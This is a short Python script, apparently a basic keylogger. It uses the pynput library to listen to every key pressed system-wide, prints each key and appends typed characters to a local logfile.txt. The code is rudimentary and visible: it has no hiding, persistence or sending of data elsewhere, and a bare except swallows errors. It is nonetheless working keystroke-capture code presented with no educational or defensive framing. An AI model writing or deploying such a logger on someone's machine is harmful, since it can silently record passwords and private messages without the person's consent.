from pynput import keyboard

def KeyPressed(key):
    print(str(key))
    with open("logfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    Listener = keyboard.Listener(on_press=KeyPressed)
    Listener.start()
    input()
